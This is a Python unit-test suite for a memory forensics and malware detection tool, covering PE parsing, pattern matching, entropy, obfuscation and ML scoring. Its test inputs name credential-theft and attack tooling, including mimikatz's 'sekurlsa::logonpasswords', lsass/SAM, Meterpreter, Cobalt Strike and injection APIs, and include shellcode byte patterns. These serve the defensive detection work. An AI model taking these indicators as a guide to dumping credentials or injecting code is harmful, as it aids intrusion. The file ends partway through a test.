#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║    ULTRA-DEEP TEST SUITE v3.0 — Memory Forensics Analyzer       ║
║    Comprehensive tests for all classes, engine, and GUI          ║
╚══════════════════════════════════════════════════════════════════╝

Tests every public method, edge case, and integration path.
Run:  python ultra_deep_test.py
"""

import unittest
import os
import sys
import struct
import json
import csv
import tempfile
import hashlib
import math
import io
import inspect
from collections import Counter
from unittest.mock import patch, MagicMock

# Ensure project directory is on path
_script_dir = os.path.dirname(os.path.abspath(__file__))
if _script_dir not in sys.path:
    sys.path.insert(0, _script_dir)

from memory_forensics_tool import (
    AdvancedPEAnalyzer,
    YARALikeEngine,
    ExternalYARALoader,
    NGramAnalyzer,
    ObfuscationDetector,
    AdvancedMLDetector,
    MLMalwareDetector,
    MemoryForensicsEngine,
)

# Path to the synthetic test dump
TEST_DUMP = os.path.join(_script_dir, 'test_forensic_dump.raw')


# ═══════════════════════════════════════════════════════════════
#  HELPERS
# ═══════════════════════════════════════════════════════════════

def _build_pe(sections=None, timestamp=0x12345678, num_sections=1, imports=None):
    """Build a minimal valid PE for testing."""
    pe = bytearray(4096)
    pe[0:2] = b'MZ'
    struct.pack_into('<I', pe, 60, 128)       # e_lfanew
    pe[128:132] = b'PE\x00\x00'
    # COFF
    struct.pack_into('<H', pe, 132, 0x14C)    # Machine: i386
    struct.pack_into('<H', pe, 134, num_sections)
    struct.pack_into('<I', pe, 136, timestamp)
    struct.pack_into('<H', pe, 148, 96)       # SizeOfOptionalHeader (minimal PE32, no data dirs)
    struct.pack_into('<H', pe, 150, 0x0102)
    # Optional header
    struct.pack_into('<H', pe, 152, 0x10b)    # PE32
    struct.pack_into('<I', pe, 168, 0x1000)   # EntryPoint
    # Section at offset 152 + 96 = 248
    sec_off = 248
    if sections:
        for i, (name, vsize, rsize, chars) in enumerate(sections):
            off = sec_off + i * 40
            pe[off:off+8] = name.ljust(8, b'\x00')[:8]
            struct.pack_into('<I', pe, off+8, vsize)
            struct.pack_into('<I', pe, off+12, 0x1000 * (i+1))
            struct.pack_into('<I', pe, off+16, rsize)
            struct.pack_into('<I', pe, off+36, chars)
    else:
        pe[sec_off:sec_off+8] = b'.text\x00\x00\x00'
        struct.pack_into('<I', pe, sec_off+8, 0x1000)
        struct.pack_into('<I', pe, sec_off+16, 0x200)
        struct.pack_into('<I', pe, sec_off+36, 0x60000020)
    # Embed imports if requested
    if imports:
        offset = 600
        for imp in imports:
            pe[offset:offset+len(imp)] = imp
            offset += len(imp) + 1
    return bytes(pe)


def _loaded_engine():
    """Return an engine loaded with the test dump."""
    engine = MemoryForensicsEngine()
    engine.load_dump(TEST_DUMP)
    return engine


# ═══════════════════════════════════════════════════════════════
#  TEST: AdvancedPEAnalyzer
# ═══════════════════════════════════════════════════════════════

class TestAdvancedPEAnalyzer(unittest.TestCase):
    """Tests for PE header analysis."""

    def setUp(self):
        self.analyzer = AdvancedPEAnalyzer()

    # -- Basic --
    def test_empty_data(self):
        r = self.analyzer.analyze(b'')
        self.assertFalse(r['is_pe'])

    def test_short_data(self):
        r = self.analyzer.analyze(b'MZ' + b'\x00' * 30)
        self.assertFalse(r['is_pe'])

    def test_non_pe_data(self):
        r = self.analyzer.analyze(b'NOT_A_PE_FILE' * 100)
        self.assertFalse(r['is_pe'])

    def test_none_data(self):
        r = self.analyzer.analyze(None)
        self.assertFalse(r['is_pe'])

    # -- Valid PE --
    def test_valid_pe(self):
        pe = _build_pe()
        r = self.analyzer.analyze(pe)
        self.assertTrue(r['is_pe'])
        self.assertIsInstance(r['sections'], list)
        self.assertIsInstance(r['anomalies'], list)

    def test_pe_zero_timestamp_anomaly(self):
        pe = _build_pe(timestamp=0)
        r = self.analyzer.analyze(pe)
        self.assertTrue(r['is_pe'])
        self.assertTrue(any('Zero timestamp' in a for a in r['anomalies']))
        self.assertGreater(r['risk_score'], 0)

    def test_pe_too_many_sections(self):
        pe = _build_pe(num_sections=25)
        r = self.analyzer.analyze(pe)
        self.assertTrue(any('section count' in a for a in r['anomalies']))

    def test_pe_packer_section(self):
        sections = [(b'.UPX0', 0x1000, 0x200, 0x60000020)]
        pe = _build_pe(sections=sections, num_sections=1)
        r = self.analyzer.analyze(pe)
        self.assertIsNotNone(r['packer_detected'])
        self.assertTrue(any('Packer' in a for a in r['anomalies']))

    def test_pe_writable_executable_section(self):
        # writable (0x80000000) + executable (0x20000000)
        sections = [(b'.text', 0x1000, 0x200, 0xA0000020)]
        pe = _build_pe(sections=sections, num_sections=1)
        r = self.analyzer.analyze(pe)
        self.assertTrue(any('writable+executable' in a for a in r['anomalies']))

    def test_pe_suspicious_size_ratio(self):
        sections = [(b'.data', 0x100000, 0x100, 0x60000020)]  # vsize >> rsize
        pe = _build_pe(sections=sections, num_sections=1)
        r = self.analyzer.analyze(pe)
        self.assertTrue(any('size ratio' in a for a in r['anomalies']))

    # -- Import analysis --
    def test_import_analysis_injection(self):
        imports = [b'VirtualAllocEx', b'WriteProcessMemory', b'CreateRemoteThread']
        pe = _build_pe(imports=imports)
        r = self.analyzer.analyze(pe)
        imp = r['imports']
        self.assertIn('injection', imp['categories'])
        self.assertGreater(imp['total'], 0)

    def test_import_analysis_no_suspicious(self):
        pe = _build_pe()
        r = self.analyzer.analyze(pe)
        self.assertEqual(r['imports']['total'], 0)

    # -- Invalid PE offset --
    def test_invalid_pe_offset(self):
        pe = bytearray(128)
        pe[0:2] = b'MZ'
        struct.pack_into('<I', pe, 60, 9999)  # offset past end
        r = self.analyzer.analyze(bytes(pe))
        self.assertTrue(r['is_pe'])
        self.assertTrue(any('Invalid PE offset' in a for a in r['anomalies']))

    def test_invalid_pe_signature(self):
        pe = bytearray(256)
        pe[0:2] = b'MZ'
        struct.pack_into('<I', pe, 60, 128)
        pe[128:132] = b'XX\x00\x00'  # bad signature
        r = self.analyzer.analyze(bytes(pe))
        self.assertTrue(any('Invalid PE signature' in a for a in r['anomalies']))

    def test_pe64_parsing(self):
        pe = bytearray(4096)
        pe[0:2] = b'MZ'
        struct.pack_into('<I', pe, 60, 128)
        pe[128:132] = b'PE\x00\x00'
        struct.pack_into('<H', pe, 134, 1)     # 1 section
        struct.pack_into('<I', pe, 136, 100)
        struct.pack_into('<H', pe, 148, 112)   # SizeOfOptionalHeader (minimal PE32+)
        struct.pack_into('<H', pe, 152, 0x20b)  # PE32+
        # section at 152 + 112 = 264
        pe[264:272] = b'.text\x00\x00\x00'
        struct.pack_into('<I', pe, 272, 0x1000)
        struct.pack_into('<I', pe, 280, 0x200)
        struct.pack_into('<I', pe, 300, 0x60000020)
        r = self.analyzer.analyze(bytes(pe))
        self.assertTrue(r['is_pe'])
        self.assertEqual(len(r['sections']), 1)


# ═══════════════════════════════════════════════════════════════
#  TEST: YARALikeEngine
# ═══════════════════════════════════════════════════════════════

class TestYARALikeEngine(unittest.TestCase):
    """Tests for YARA-like pattern matching."""

    def setUp(self):
        self.engine = YARALikeEngine()

    def test_no_matches_clean_data(self):
        r = self.engine.scan(b'This is perfectly clean data with nothing suspicious at all.')
        self.assertEqual(len(r), 0)

    def test_mimikatz_detection(self):
        data = b'\x00' * 100 + b'mimikatz' + b'\x00' * 50 + b'gentilkiwi' + b'\x00' * 50 + b'sekurlsa' + b'\x00' * 100
        r = self.engine.scan(data)
        names = [m['rule'] for m in r]
        self.assertIn('Mimikatz', names)

    def test_meterpreter_detection(self):
        data = b'\x00' * 50 + b'metsrv' + b'\x00' * 50 + b'ext_server_stdapi' + b'\x00' * 50 + b'ReflectiveLoader' + b'\x00' * 50
        r = self.engine.scan(data)
        names = [m['rule'] for m in r]
        self.assertIn('Metasploit_Meterpreter', names)

    def test_cobalt_strike_detection(self):
        data = b'\x00' * 50 + b'beacon.dll' + b'\x00' * 50 + b'beacon.x64.dll' + b'\x00' * 50
        r = self.engine.scan(data)
        names = [m['rule'] for m in r]
        self.assertIn('CobaltStrike_Beacon', names)

    def test_empire_detection(self):
        data = b'\x00' * 50 + b'Invoke-Empire' + b'\x00' * 50 + b'empire_staging' + b'\x00' * 50
        r = self.engine.scan(data)
        names = [m['rule'] for m in r]
        self.assertIn('PowerShell_Empire', names)

    def test_process_injection_detection(self):
        data = (b'\x00' * 50 + b'VirtualAllocEx' + b'\x00' * 50 +
                b'WriteProcessMemory' + b'\x00' * 50 + b'CreateRemoteThread' + b'\x00' * 50)
        r = self.engine.scan(data)
        names = [m['rule'] for m in r]
        self.assertIn('Process_Injection', names)

    def test_credential_dumper_detection(self):
        data = (b'\x00' * 50 + b'lsass' + b'\x00' * 50 +
                b'SECURITY' + b'\x00' * 50 + b'SAM' + b'\x00' * 50)
        r = self.engine.scan(data)
        names = [m['rule'] for m in r]
        self.assertIn('Credential_Dumper', names)

    def test_ransomware_detection(self):
        data = b'\x00' * 50 + b'YOUR FILES HAVE BEEN ENCRYPTED' + b'\x00' * 50 + b'Bitcoin' + b'\x00' * 50
        r = self.engine.scan(data)
        names = [m['rule'] for m in r]
        self.assertIn('Ransomware_Indicators', names)

    def test_shellcode_nop_sled(self):
        data = b'\x00' * 50 + b'\x90' * 16 + b'\x00' * 50
        r = self.engine.scan(data)
        names = [m['rule'] for m in r]
        self.assertIn('Shellcode_Generic', names)

    def test_shellcode_xor_instructions(self):
        data = b'\x00' * 50 + b'\x31\xc0' + b'\x31\xdb' + b'\x31\xc9' + b'\x00' * 50
        r = self.engine.scan(data)
        names = [m['rule'] for m in r]
        self.assertIn('Shellcode_Generic', names)

    def test_result_structure(self):
        data = b'\x00' * 50 + b'mimikatz' + b'\x00' * 50 + b'gentilkiwi' + b'\x00' * 50 + b'sekurlsa' + b'\x00' * 50
        r = self.engine.scan(data)
        for match in r:
            self.assertIn('rule', match)
            self.assertIn('severity', match)
            self.assertIn('confidence', match)
            self.assertIn('offset', match)
            self.assertIn('total_matches', match)
            self.assertLessEqual(match['confidence'], 99.5)

    def test_confidence_cap(self):
        """Confidence should never exceed 99.5"""
        data = b'\x00'.join([b'mimikatz', b'gentilkiwi', b'sekurlsa', b'kerberos::',
                             b'lsadump::', b'privilege::debug', b'token::elevate'])
        r = self.engine.scan(data)
        for match in r:
            self.assertLessEqual(match['confidence'], 99.5)

    def test_empty_data(self):
        r = self.engine.scan(b'')
        self.assertEqual(len(r), 0)

    def test_scan_full_dump(self):
        with open(TEST_DUMP, 'rb') as f:
            data = f.read()
        r = self.engine.scan(data)
        self.assertIsInstance(r, list)
        self.assertGreater(len(r), 0)  # Our test dump has embedded patterns


# ═══════════════════════════════════════════════════════════════
#  TEST: NGramAnalyzer
# ═══════════════════════════════════════════════════════════════

class TestNGramAnalyzer(unittest.TestCase):
    """Tests for N-gram byte analysis."""

    def setUp(self):
        self.analyzer = NGramAnalyzer()

    def test_empty_data(self):
        r = self.analyzer.analyze(b'')
        self.assertEqual(r['risk_score'], 0)

    def test_short_data(self):
        r = self.analyzer.analyze(b'\x00', ngram_size=3)
        self.assertEqual(r['risk_score'], 0)

    def test_clean_text(self):
        r = self.analyzer.analyze(b'Hello this is perfectly normal text data' * 10)
        self.assertEqual(r['risk_score'], 0)

    def test_shellcode_patterns(self):
        data = b'\xff\xd0' * 5 + b'\xff\xe0' * 5 + b'\xff\xe4' * 5 + b'\x00' * 100
        r = self.analyzer.analyze(data)
        self.assertGreater(r['risk_score'], 0)

    def test_result_structure(self):
        r = self.analyzer.analyze(b'\x00' * 1000)
        self.assertIn('risk_score', r)
        self.assertIn('suspicious_patterns', r)
        self.assertIn('unique_ngrams', r)
        self.assertIn('total_ngrams', r)

    def test_risk_score_capped_at_100(self):
        # Generate lots of suspicious patterns
        data = b'\xff\xd0\xff\xe0\xff\xe4\x31\xc0\x50\x31\xdb\x53' * 200
        r = self.analyzer.analyze(data)
        self.assertLessEqual(r['risk_score'], 100)

    def test_custom_ngram_size(self):
        r = self.analyzer.analyze(b'\x00' * 100, ngram_size=5)
        self.assertIn('unique_ngrams', r)


# ═══════════════════════════════════════════════════════════════
#  TEST: ObfuscationDetector
# ═══════════════════════════════════════════════════════════════

class TestObfuscationDetector(unittest.TestCase):
    """Tests for obfuscation/packing detection."""

    def setUp(self):
        self.detector = ObfuscationDetector()

    def test_empty_data(self):
        r = self.detector.analyze(b'')
        self.assertFalse(r['is_obfuscated'])
        self.assertEqual(r['confidence'], 0)

    def test_short_data(self):
        r = self.detector.analyze(b'short')
        self.assertFalse(r['is_obfuscated'])

    def test_normal_text(self):
        r = self.detector.analyze(b'This is normal text data. ' * 100)
        self.assertFalse(r['is_obfuscated'])

    def test_high_entropy_data(self):
        """Random bytes should have high entropy."""
        import random
        random.seed(99)
        data = bytes(random.randint(0, 255) for _ in range(10000))
        r = self.detector.analyze(data)
        self.assertGreater(r['entropy_score'], 7.0)

    def test_upx_packer_detection(self):
        data = b'\x00' * 500 + b'UPX!' + b'\x00' * 500
        r = self.detector.analyze(data)
        self.assertTrue(any('UPX' in t for t in r['techniques']))

    def test_aspack_packer_detection(self):
        data = b'\x00' * 500 + b'ASPack' + b'\x00' * 500
        r = self.detector.analyze(data)
        self.assertTrue(any('ASPack' in t for t in r['techniques']))

    def test_themida_detection(self):
        data = b'\x00' * 500 + b'Themida' + b'\x00' * 500
        r = self.detector.analyze(data)
        self.assertTrue(any('Themida' in t for t in r['techniques']))

    def test_vmprotect_detection(self):
        data = b'\x00' * 500 + b'.vmp0' + b'\x00' * 500
        r = self.detector.analyze(data)
        self.assertTrue(any('VMProtect' in t for t in r['techniques']))

    def test_base64_detection(self):
        data = b'Normal preamble ' * 50
        data += b'SSBhbSBhIGxvbmcgYmFzZTY0IGVuY29kZWQgc3RyaW5nIHRoYXQgc2hvdWxkIGJlIGRldGVjdGVk'
        data += b' more data ' * 50
        r = self.detector.analyze(data)
        self.assertTrue(any('Base64' in t for t in r['techniques']))

    def test_confidence_capped_at_99(self):
        data = b'\x00' * 500 + b'UPX!' + b'Themida' + b'ASPack'
        import random
        random.seed(42)
        data += bytes(random.randint(0, 255) for _ in range(5000))
        r = self.detector.analyze(data)
        self.assertLessEqual(r['confidence'], 99)

    def test_entropy_calculation(self):
        # All same byte → entropy = 0
        e = self.detector._calculate_entropy(b'\x00' * 1000)
        self.assertAlmostEqual(e, 0.0)
        # Perfectly uniform → entropy ≈ 8
        data = bytes(range(256)) * 100
        e = self.detector._calculate_entropy(data)
        self.assertGreater(e, 7.9)

    def test_xor_detection(self):
        # One byte dominates → high XOR score
        data = b'\x41' * 200 + b'\x00' * 10
        score = self.detector._detect_xor_encoding(data)
        self.assertGreater(score, 0.5)

    def test_xor_no_detection(self):
        score = self.detector._detect_xor_encoding(b'')
        self.assertEqual(score, 0.0)


# ═══════════════════════════════════════════════════════════════
#  TEST: AdvancedMLDetector (ensemble of PE+YARA+NGram+Obfuscation)
# ═══════════════════════════════════════════════════════════════

class TestAdvancedMLDetector(unittest.TestCase):
    """Tests for the multi-layer ensemble detector."""

    def setUp(self):
        self.detector = AdvancedMLDetector()

    def test_clean_data(self):
        r = self.detector.detect(b'Clean legitimate data. ' * 100)
        self.assertFalse(r['is_malicious'])
        self.assertEqual(r['risk_level'], 'LOW')

    def test_empty_data(self):
        r = self.detector.detect(b'')
        self.assertFalse(r['is_malicious'])

    def test_short_data(self):
        r = self.detector.detect(b'short')
        self.assertFalse(r['is_malicious'])

    def test_malicious_data(self):
        """Data with multiple strong indicators should be flagged."""
        data = _build_pe(imports=[b'VirtualAllocEx', b'WriteProcessMemory', b'CreateRemoteThread'])
        data += b'mimikatz' + b'\x00' * 50 + b'gentilkiwi' + b'\x00' * 50 + b'sekurlsa'
        r = self.detector.detect(data)
        self.assertGreater(r['ensemble_score'], 0)
        self.assertIn('analysis', r)
        self.assertIn('pe', r['analysis'])
        self.assertIn('yara', r['analysis'])
        self.assertIn('ngram', r['analysis'])
        self.assertIn('obfuscation', r['analysis'])

    def test_result_structure(self):
        r = self.detector.detect(b'\x00' * 200)
        self.assertIn('is_malicious', r)
        self.assertIn('confidence', r)
        self.assertIn('risk_level', r)
        self.assertIn('detections', r)

    def test_risk_levels(self):
        # Check that risk_level is a valid value
        r = self.detector.detect(b'\x00' * 200)
        self.assertIn(r['risk_level'], ['LOW', 'MEDIUM', 'HIGH', 'CRITICAL'])

    def test_detailed_report(self):
        data = b'\x00' * 200
        report = self.detector.get_detailed_report(data)
        self.assertIsInstance(report, str)
        self.assertIn('ADVANCED ENTERPRISE MALWARE DETECTION REPORT', report)

    def test_weights_sum_to_one(self):
        total = sum(self.detector.weights.values())
        self.assertAlmostEqual(total, 1.0, places=2)


# ═══════════════════════════════════════════════════════════════
#  TEST: MLMalwareDetector
# ═══════════════════════════════════════════════════════════════

class TestMLMalwareDetector(unittest.TestCase):
    """Tests for ML-based malware detection."""

    def setUp(self):
        self.detector = MLMalwareDetector()

    def test_clean_data(self):
        data = b'Normal safe text data content. ' * 100
        r = self.detector.detect(data)
        self.assertIn('is_malicious', r)
        self.assertIn('confidence', r)
        self.assertIn('features', r)

    def test_insufficient_data(self):
        r = self.detector.detect(b'tiny')
        self.assertFalse(r['is_malicious'])
        self.assertIn('Insufficient data', r.get('precision_note', ''))

    def test_empty_data(self):
        r = self.detector.detect(b'')
        self.assertFalse(r['is_malicious'])

    def test_mimikatz_fingerprint(self):
        data = b'\x00' * 500 + b'gentilkiwi' + b'\x00' * 100 + b'mimikatz' + b'\x00' * 100 + b'sekurlsa::logonpasswords'
        data += b'\x00' * 500
        r = self.detector.detect(data)
        # Should find mimikatz family
        families = [d['family'] for d in r.get('detections', [])]
        self.assertTrue(any('Mimikatz' in f for f in families))

    def test_metasploit_fingerprint(self):
        data = b'\x00' * 500 + b'metsrv.dll' + b'\x00' * 100 + b'ext_server_stdapi' + b'\x00' * 100 + b'ReflectiveLoader'
        data += b'\x00' * 500
        r = self.detector.detect(data)
        families = [d['family'] for d in r.get('detections', [])]
        self.assertTrue(any('Metasploit' in f for f in families))

    def test_feature_extraction(self):
        data = b'\x00' * 2000
        features = self.detector.extract_features(data)
        self.assertIn('entropy', features)
        self.assertIn('api_pattern_score', features)
        self.assertIn('string_ioc_score', features)
        self.assertIn('byte_distribution_anomaly', features)
        self.assertIn('structural_anomaly', features)
        self.assertIn('legitimate_score', features)

    def test_entropy_calculation(self):
        e = self.detector._calculate_entropy(b'\x00' * 1000)
        self.assertAlmostEqual(e, 0.0)
        data = bytes(range(256)) * 10
        e = self.detector._calculate_entropy(data)
        self.assertGreater(e, 7.9)

    def test_entropy_variance(self):
        data = b'\x00' * 8192
        v = self.detector._calculate_entropy_variance(data)
        self.assertAlmostEqual(v, 0.0)

    def test_entropy_variance_short_data(self):
        v = self.detector._calculate_entropy_variance(b'abc')
        self.assertEqual(v, 0.0)

    def test_byte_distribution(self):
        r = self.detector._analyze_byte_distribution(b'\x00' * 100)
        self.assertEqual(r['null_ratio'], 1.0)
        self.assertEqual(r['printable_ratio'], 0.0)

    def test_byte_distribution_empty(self):
        r = self.detector._analyze_byte_distribution(b'')
        self.assertEqual(r['anomaly_score'], 0.0)

    def test_api_pattern_scoring(self):
        data = (b'\x00' * 50 + b'VirtualAllocEx' + b'\x00' * 50 +
                b'WriteProcessMemory' + b'\x00' * 50 + b'CreateRemoteThread' + b'\x00' * 200)
        score = self.detector._score_api_patterns(data)
        self.assertGreater(score, 0)

    def test_legitimate_indicators(self):
        data = b'\x00' * 500 + b'Microsoft Corporation' + b'\x00' * 100 + b'Copyright (c)' + b'\x00' * 500
        score = self.detector._score_legitimate_indicators(data)
        self.assertGreater(score, 0)

    def test_structural_analysis(self):
        data = b'\x90' * 8 + b'\x31\xc0' + b'\x31\xdb' + b'\x31\xc9' + b'\x00' * 100
        score = self.detector._analyze_structure(data)
        self.assertGreater(score, 0)

    def test_validation(self):
        data = b'\x00' * 2000
        r = self.detector.detect(data)
        validation = self.detector.validate_detection(data, r.get('detections', []))
        self.assertIn('validated', validation)
        self.assertIn('validation_score', validation)
        self.assertIn('checks_passed', validation)

    def test_precision_mode(self):
        self.detector.precision_mode = True
        data = b'\x00' * 2000
        r = self.detector.detect(data)
        self.assertIn('precision_note', r)

    def test_confidence_capped(self):
        """Confidence should never exceed 0.995"""
        data = (b'\x00' * 500 + b'gentilkiwi' + b'mimikatz' + b'sekurlsa::logonpasswords'
                + b'VirtualAllocEx' + b'WriteProcessMemory' + b'CreateRemoteThread'
                + b'NtCreateThreadEx' + b'RtlCreateUserThread' + b'QueueUserAPC'
                + b'\x00' * 500)
        r = self.detector.detect(data)
        self.assertLessEqual(r['confidence'], 0.995)


# ═══════════════════════════════════════════════════════════════
#  TEST: MemoryForensicsEngine
# ═══════════════════════════════════════════════════════════════

class TestEngineInit(unittest.TestCase):
    """Engine initialization tests."""

    def test_default_state(self):
        e = MemoryForensicsEngine()
        self.assertIsNone(e.dump_data)
        self.assertIsNone(e.dump_path)
        self.assertEqual(e.dump_size, 0)
        self.assertEqual(e.risk_score, 0)
        self.assertEqual(e.findings, [])
        self.assertIsNotNone(e.ml_detector)
        self.assertIsNotNone(e.advanced_detector)


class TestEngineLoad(unittest.TestCase):
    """Tests for loading dumps."""

    def test_load_test_dump(self):
        e = MemoryForensicsEngine()
        size = e.load_dump(TEST_DUMP)
        self.assertGreater(size, 0)
        self.assertIsNotNone(e.dump_data)
        self.assertEqual(e.dump_path, TEST_DUMP)
        self.assertEqual(e.dump_size, size)

    def test_load_nonexistent_file(self):
        e = MemoryForensicsEngine()
        with self.assertRaises((FileNotFoundError, OSError)):
            e.load_dump('nonexistent_file.raw')


class TestEngineHashes(unittest.TestCase):
    """Tests for file hash computation."""

    def test_hashes_no_data(self):
        e = MemoryForensicsEngine()
        self.assertEqual(e.get_file_hashes(), {})

    def test_hashes_with_data(self):
        e = _loaded_engine()
        h = e.get_file_hashes()
        self.assertIn('MD5', h)
        self.assertIn('SHA1', h)
        self.assertIn('SHA256', h)
        self.assertEqual(len(h['MD5']), 32)
        self.assertEqual(len(h['SHA1']), 40)
        self.assertEqual(len(h['SHA256']), 64)

    def test_hashes_consistency(self):
        e = _loaded_engine()
        h1 = e.get_file_hashes()
        h2 = e.get_file_hashes()
        self.assertEqual(h1, h2)

    def test_get_hashes_alias(self):
        e = _loaded_engine()
        h = e.get_hashes()
        self.assertIn('md5', h)
        self.assertIn('sha1', h)
        self.assertIn('sha256', h)

    def test_get_hashes_no_data(self):
        e = MemoryForensicsEngine()
        h = e.get_hashes()
        self.assertEqual(h['md5'], '')
        self.assertEqual(h['sha1'], '')
        self.assertEqual(h['sha256'], '')


class TestEngineDumpType(unittest.TestCase):
    """Tests for dump type detection."""

    def test_no_data(self):
        e = MemoryForensicsEngine()
        self.assertEqual(e.detect_dump_type(), "Unknown")

    def test_minidump(self):
        e = MemoryForensicsEngine()
        e.dump_data = b'MDMP' + b'\x00' * 100
        e.dump_size = 104
        self.assertEqual(e.detect_dump_type(), "Windows Minidump (.dmp)")

    def test_full_dump(self):
        e = MemoryForensicsEngine()
        e.dump_data = b'PAGE' + b'\x00' * 100
        e.dump_size = 104
        self.assertEqual(e.detect_dump_type(), "Windows Full Memory Dump")

    def test_pmem(self):
        e = MemoryForensicsEngine()
        e.dump_data = b'PMEM' + b'\x00' * 100
        e.dump_size = 104
        self.assertEqual(e.detect_dump_type(), "PMem Format")

    def test_kernel_dump(self):
        e = MemoryForensicsEngine()
        e.dump_data = b'KDMP\x00\x00\x00\x00' + b'\x00' * 100
        e.dump_size = 108
        self.assertEqual(e.detect_dump_type(), "Windows Kernel Dump")

    def test_elf_core(self):
        e = MemoryForensicsEngine()
        e.dump_data = b'\x7fELF' + b'\x00' * 100
        e.dump_size = 104
        self.assertEqual(e.detect_dump_type(), "ELF Core Dump (Linux)")

    def test_pe_executable(self):
        e = MemoryForensicsEngine()
        e.dump_data = b'MZ' + b'\x00' * 100
        e.dump_size = 102
        self.assertEqual(e.detect_dump_type(), "PE Executable (Possible Process Dump)")

    def test_vmem(self):
        e = MemoryForensicsEngine()
        e.dump_data = b'\x00' * 200
        e.dump_size = 200
        e.dump_path = 'test.vmem'
        self.assertEqual(e.detect_dump_type(), "VMware Snapshot (.vmem)")

    def test_raw_dump(self):
        e = _loaded_engine()
        dt = e.detect_dump_type()
        self.assertIn('Raw Memory Dump', dt)


class TestEngineStrings(unittest.TestCase):
    """Tests for string extraction."""

    def test_no_data(self):
        e = MemoryForensicsEngine()
        self.assertEqual(e.extract_strings(), [])

    def test_ascii_strings(self):
        e = _loaded_engine()
        strings = e.extract_strings(min_length=6, encoding='ascii')
        self.assertIsInstance(strings, list)
        self.assertGreater(len(strings), 0)
        for s in strings:
            self.assertIn('offset', s)
            self.assertIn('type', s)
            self.assertIn('value', s)
            self.assertEqual(s['type'], 'ASCII')

    def test_unicode_strings(self):
        e = _loaded_engine()
        strings = e.extract_strings(min_length=6, encoding='unicode')
        self.assertIsInstance(strings, list)
        # Our dump has UTF-16-LE strings
        for s in strings:
            self.assertEqual(s['type'], 'Unicode')

    def test_both_encodings(self):
        e = _loaded_engine()
        strings = e.extract_strings(min_length=6, encoding='both')
        types = set(s['type'] for s in strings)
        self.assertIn('ASCII', types)

    def test_min_length_filter(self):
        e = _loaded_engine()
        strings = e.extract_strings(min_length=20)
        for s in strings:
            self.assertGreaterEqual(len(s['value']), 20)


class TestEngineProcesses(unittest.TestCase):
    """Tests for process discovery."""

    def test_no_data(self):
        e = MemoryForensicsEngine()
        self.assertEqual(e.find_processes(), [])

    def test_finds_processes(self):
        e = _loaded_engine()
        procs = e.find_processes()
        self.assertIsInstance(procs, list)
        self.assertGreater(len(procs), 0)

    def test_process_structure(self):
        e = _loaded_engine()
        procs = e.find_processes()
        for p in procs:
            self.assertIn('offset', p)
            self.assertIn('name', p)
            self.assertIn('type', p)
            self.assertIn('suspicious', p)

    def test_finds_suspicious_processes(self):
        e = _loaded_engine()
        procs = e.find_processes()
        suspicious = [p for p in procs if p['suspicious']]
        self.assertGreater(len(suspicious), 0)

    def test_scan_processes_alias(self):
        e = _loaded_engine()
        procs = e.scan_processes()
        self.assertIsInstance(procs, list)
        self.assertGreater(len(procs), 0)

    def test_is_suspicious_process(self):
        e = MemoryForensicsEngine()
        self.assertTrue(e._is_suspicious_process('mimikatz.exe'))
        self.assertTrue(e._is_suspicious_process('mimikatz'))
        self.assertTrue(e._is_suspicious_process('beacon.exe'))
        self.assertFalse(e._is_suspicious_process('notepad.exe'))
        self.assertFalse(e._is_suspicious_process(''))
        self.assertFalse(e._is_suspicious_process('abc'))
        self.assertFalse(e._is_suspicious_process(None))

    def test_is_suspicious_with_path(self):
        e = MemoryForensicsEngine()
        self.assertTrue(e._is_suspicious_process('C:\\Temp\\mimikatz.exe'))
        self.assertFalse(e._is_suspicious_process('C:\\Windows\\notepad.exe'))


class TestEngineNetwork(unittest.TestCase):
    """Tests for network artifact extraction."""

    def test_no_data(self):
        e = MemoryForensicsEngine()
        self.assertEqual(e.extract_network_artifacts(), {})

    def test_finds_artifacts(self):
        e = _loaded_engine()
        net = e.extract_network_artifacts()
        self.assertIn('ipv4', net)
        self.assertIn('url', net)
        self.assertIn('domain', net)
        self.assertIn('email', net)

    def test_finds_ips(self):
        e = _loaded_engine()
        net = e.extract_network_artifacts()
        self.assertGreater(len(net['ipv4']), 0)

    def test_finds_urls(self):
        e = _loaded_engine()
        net = e.extract_network_artifacts()
        self.assertGreater(len(net['url']), 0)

    def test_finds_domains(self):
        e = _loaded_engine()
        net = e.extract_network_artifacts()
        self.assertGreater(len(net['domain']), 0)

    def test_finds_emails(self):
        e = _loaded_engine()
        net = e.extract_network_artifacts()
        self.assertGreater(len(net['email']), 0)


class TestEngineMalwareSignatures(unittest.TestCase):
    """Tests for malware signature detection."""

    def test_no_data(self):
        e = MemoryForensicsEngine()
        self.assertEqual(e.detect_malware_signatures(), [])

    def test_finds_signatures(self):
        e = _loaded_engine()
        sigs = e.detect_malware_signatures()
        self.assertIsInstance(sigs, list)
        self.assertGreater(len(sigs), 0)

    def test_signature_structure(self):
        e = _loaded_engine()
        sigs = e.detect_malware_signatures()
        for sig in sigs:
            self.assertIn('name', sig)
            self.assertIn('matched_signatures', sig)
            self.assertIn('total_signatures', sig)
            self.assertIn('confidence', sig)
            self.assertIn('severity', sig)
            self.assertIn(sig['severity'], ['CRITICAL', 'HIGH', 'MEDIUM'])

    def test_scan_malware_alias(self):
        e = _loaded_engine()
        sigs = e.scan_malware_signatures()
        self.assertIsInstance(sigs, list)

    def test_finds_mimikatz(self):
        e = _loaded_engine()
        sigs = e.detect_malware_signatures()
        names = [s['name'] for s in sigs]
        self.assertIn('Mimikatz', names)


class TestEngineMLDetection(unittest.TestCase):
    """Tests for ML-based malware detection."""

    def test_no_data(self):
        e = MemoryForensicsEngine()
        r = e.ml_detect_malware()
        self.assertFalse(r['is_malicious'])

    def test_with_test_dump(self):
        e = _loaded_engine()
        r = e.ml_detect_malware(precision_mode=True)
        self.assertIn('is_malicious', r)
        self.assertIn('confidence', r)
        self.assertIn('validation', r)
        self.assertIn('estimated_precision', r)

    def test_precision_mode_flag(self):
        e = _loaded_engine()
        r = e.ml_detect_malware(precision_mode=False)
        self.assertIn('is_malicious', r)

    def test_ml_report(self):
        e = _loaded_engine()
        report = e.get_ml_analysis_report()
        self.assertIsInstance(report, str)
        self.assertIn('ML-BASED MALWARE DETECTION REPORT', report)

    def test_ml_report_no_data(self):
        e = MemoryForensicsEngine()
        report = e.get_ml_analysis_report()
        self.assertIn('No data loaded', report)


class TestEngineAdvancedML(unittest.TestCase):
    """Tests for advanced ML detection."""

    def test_no_data(self):
        e = MemoryForensicsEngine()
        r = e.advanced_ml_detect()
        self.assertFalse(r['is_malicious'])
        self.assertEqual(r['risk_level'], 'LOW')

    def test_with_test_dump(self):
        e = _loaded_engine()
